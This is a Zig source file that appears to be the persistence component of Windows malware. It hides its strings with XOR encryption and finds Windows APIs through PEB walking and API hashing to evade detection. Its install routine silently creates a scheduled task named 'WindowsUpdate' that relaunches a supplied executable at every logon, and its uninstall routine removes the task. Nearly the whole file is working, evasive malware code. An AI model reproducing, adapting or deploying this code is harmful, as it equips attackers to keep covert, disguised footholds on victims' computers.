const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const schtasks_path = hash.xorEncrypt("schtasks");
    pub const schtasks_args = hash.xorEncrypt("/create /tn \"");
    pub const task_name = hash.xorEncrypt("WindowsUpdate");
    pub const schtasks_mid = hash.xorEncrypt("\" /tr \"");
    pub const schtasks_end = hash.xorEncrypt("\" /sc onlogon /f");
    pub const schtasks_del = hash.xorEncrypt("schtasks /delete /tn \"");
    pub const schtasks_del_end = hash.xorEncrypt("\" /f");
};

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn createProcess(cmd: []const u16) bool {
    const kernel32 = loadKernel32() orelse return false;
    const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));
    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);
    return CreateProcessW(null, @constCast(@as([*:0]const u16, @ptrCast(cmd.ptr))), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0;
}

pub fn install(exe_path: []const u8) bool {
    var tmp_schtasks: [E.schtasks_path.len]u8 = undefined;
    var tmp_args: [E.schtasks_args.len]u8 = undefined;
    var tmp_tname: [E.task_name.len]u8 = undefined;
    var tmp_mid: [E.schtasks_mid.len]u8 = undefined;
    var tmp_end: [E.schtasks_end.len]u8 = undefined;
    hash.xorDecrypt(&E.schtasks_path, &tmp_schtasks);
    hash.xorDecrypt(&E.schtasks_args, &tmp_args);
    hash.xorDecrypt(&E.task_name, &tmp_tname);
    hash.xorDecrypt(&E.schtasks_mid, &tmp_mid);
    hash.xorDecrypt(&E.schtasks_end, &tmp_end);
    var cmd_buf: [4096]u8 = undefined;
    var pos: usize = 0;
    @memcpy(cmd_buf[pos..][0..tmp_schtasks.len], &tmp_schtasks);
    pos += tmp_schtasks.len;
    @memcpy(cmd_buf[pos..][0..1], " ");
    pos += 1;
    @memcpy(cmd_buf[pos..][0..tmp_args.len], &tmp_args);
    pos += tmp_args.len;
    @memcpy(cmd_buf[pos..][0..tmp_tname.len], &tmp_tname);
    pos += tmp_tname.len;
    @memcpy(cmd_buf[pos..][0..tmp_mid.len], &tmp_mid);
    pos += tmp_mid.len;
    @memcpy(cmd_buf[pos..][0..exe_path.len], exe_path);
    pos += exe_path.len;
    @memcpy(cmd_buf[pos..][0..tmp_end.len], &tmp_end);
    pos += tmp_end.len;
    var cmd_wide: [4096]u16 = undefined;
    for (0..pos) |i| cmd_wide[i] = cmd_buf[i];
    cmd_wide[pos] = 0;
    return createProcess(cmd_wide[0..pos]);
}

pub fn uninstall() bool {
    var tmp_del: [E.schtasks_del.len]u8 = undefined;
    var tmp_tname: [E.task_name.len]u8 = undefined;
    var tmp_end: [E.schtasks_del_end.len]u8 = undefined;
    hash.xorDecrypt(&E.schtasks_del, &tmp_del);
    hash.xorDecrypt(&E.task_name, &tmp_tname);
    hash.xorDecrypt(&E.schtasks_del_end, &tmp_end);
    var cmd_buf: [512]u8 = undefined;
    var pos: usize = 0;
    @memcpy(cmd_buf[pos..][0..tmp_del.len], &tmp_del);
    pos += tmp_del.len;
    @memcpy(cmd_buf[pos..][0..tmp_tname.len], &tmp_tname);
    pos += tmp_tname.len;
    @memcpy(cmd_buf[pos..][0..tmp_end.len], &tmp_end);
    pos += tmp_end.len;
    var cmd_wide: [512]u16 = undefined;
    for (0..pos) |i| cmd_wide[i] = cmd_buf[i];
    cmd_wide[pos] = 0;
    return createProcess(cmd_wide[0..pos]);
}

test "scheduler install returns bool" {
    _ = install("C:\\test.exe");
}

test "scheduler uninstall returns bool" {
    _ = uninstall();
}
